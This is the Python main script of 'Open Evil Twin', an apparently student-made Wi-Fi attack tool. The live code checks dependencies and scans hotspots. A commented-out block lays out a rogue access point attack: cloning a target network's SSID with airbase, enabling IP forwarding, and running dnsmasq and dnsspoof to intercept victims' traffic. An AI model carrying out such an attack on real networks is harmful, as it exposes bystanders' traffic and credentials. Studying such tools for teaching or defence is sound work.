#!/usr/bin/env python


# Generic/Built-in
import logging
import txt
import time
import sys
from core import wifi
import subprocess
from wireless import Wireless
from colorama import Fore

# Owned
from core import aircrack, utils
from core.utils import warning, question, wait, information, found, tiret
from core.interface import upInterface, downInterface

__author__ = "Quentin Royer"
__license__ = "GNU GPLv3"
__version__ = "0.1.0"
__maintainer__ = "Quentin Royer"
__email__ = "quentin.royer@edu.itescia.fr"
__status__ = "Dev"

stop = False
listSoft = ["dnsmasq", "dsniff", "aircrack-ng"]
wireless = Wireless()




print(txt.logo)

print("Welcome in Open Evil Twin. Please wait, we are verifing your installation...")
time.sleep(3)

print(wait+"Package dependancies..")

for soft in listSoft:
    exist = subprocess.call('dpkg -l ' + soft + '>> /dev/null', shell=True)
    if exist == 0:
        print(information + soft + " installed")
    else:
        print(warning + soft + " not installed")
        stop = True


if stop:
    print(wait+"Please install missing package")
    exit(1)
    sys.exit("\n"+warning+ "Please install missing package\n")

time.sleep(2)


try:
    while True:
        print(txt.mainOption)
        time.sleep(1)

        option = input("\n OET("+Fore.BLUE + "~" + Fore.RESET + ")$ ")

        if option.lower() == "h":
            print(txt.helpMain)
        elif option.lower() == "c":
            utils.clear()
            print(txt.mainOption)
        elif option.lower() == "e":
            sys.exit(information + "Bye :)")
        elif option.lower() == "1":
            utils.clear()
            interfaces, interface = wifi.scanningInterfaces(wireless)
            print("\n"+ wait+"Upping interface...")
            upInterface(interfaces[interface])
            print("\n"+ wait +"Scanning hotspots wifi...")
            hotspots = wifi.scanHotspots(interfaces[interface])
            for hotspot in hotspots:
                print(hotspot)
        elif option.lower() == "2":

            pass
        flag = True
        while flag:
            print(question + "Type 'e' to exit and 'r' to restart the script")
            choice = input("\n OET("+Fore.BLUE + "~" + Fore.RESET + ")$ ")
            if choice == "e":
                sys.exit("\n" + information + "Bye ! :)")
            if choice == "r":
                flag = False
        utils.clear()




except KeyboardInterrupt:
	sys.exit("\n"+information+" Bye ! :)")

"""try:
    parser = argparse.ArgumentParser()
    parser.add_argument("--scan", "-s", help="This argument allows to launch an wifi scan", action="store_true")
    parser.add_argument("--attack", "-a", help="This argument allows to launch an evil twin attack", action="store_true")
    parser.add_argument("--verbose", "-v", help="This argument active verbose mode", action="store_true")
    parser.add_argument("--dnsmasq", "-d", help="Path to dnsmasq config file")
    parser.add_argument("interface", help="This argument specify the interface for scan or attack")
    args = parser.parse_args()

    interface = args.interface


    # if user launch a scan
    if args.scan and not args.attack:
        logging.info("Upping the interface " + interface)

        # up the interface
        resultUpInterface = utils.upInterface(interface)

        if resultUpInterface:

            logging.info("Scanning hotspots...")


            hotspots = utils.scanHotspots(interface)


            if args.verbose:
                for hotspot in hotspots:
                    print(hotspot)
            else:
                for i, hotspot in enumerate(hotspots):
                    print(str(i) + " - " + hotspot.getName())

        # if we can't up the interface, quit the script
        else:
            logging.warning("Ce can't up the inferface, exiting...")
            time.sleep(2)
            quit()

    # if user launch an attack
    if args.attack and not args.scan:

        logging.info("Upping the interface...")

        # up the interface
        resultUpInterface = utils.upInterface(interface)

        if not resultUpInterface:
            logging.warning("Can't up the interface, exiting...")
            exit()

        logging.info("Scanning hotspots...")

        #scan hotspots an let user choose its target
        hotspots = utils.scanHotspots(interface)

        for i, hotspot in enumerate(hotspots):
            print(str(i) + " - " + str(hotspot))
        target = int(input("Select the target's ID (1, 2, 3...)"))

        utils.clear()

        logging.info("Set interface(%s) in monitor mode", interface)

        #Set interface in monitor mode
        airmonResult = aircrack.airmonStart(interface)
        if not airmonResult:
            logging.warning("Can't set interface in monitor mode ! Exiting...")
            exit()

        interface = interface + "mon"

        logging.info("Launching attack...")

        # launch the attck
        airbaseResult, airbaseProcess = aircrack.airbaseStart(interface, hotspots[target].ssid, str(hotspots[target].channel))
        if not airbaseResult:
            exit()

        time.sleep(10)
        # mount at0 interface
        resultUpInterface = utils.upInterface("at0", "10.0.0.1")
        if not resultUpInterface:
            exit()

        # enable ip forward
        resultIpForward = utils.enableIPForward()

        #stop resovled process
        for i in range(5):
            resultResolved = utils.stopSystemdResolved()

        time.sleep(5)

        # enable
        resultDnsMasq = utils.launchDnsmasq(args.dnsmasq)

        # enable dnsspoof
        resultDnsSpoof = utils.launchDnsSpoof()


except Exception as e:
    print("Exception occured: " + e)
except KeyboardInterrupt:
    print("ok")"""

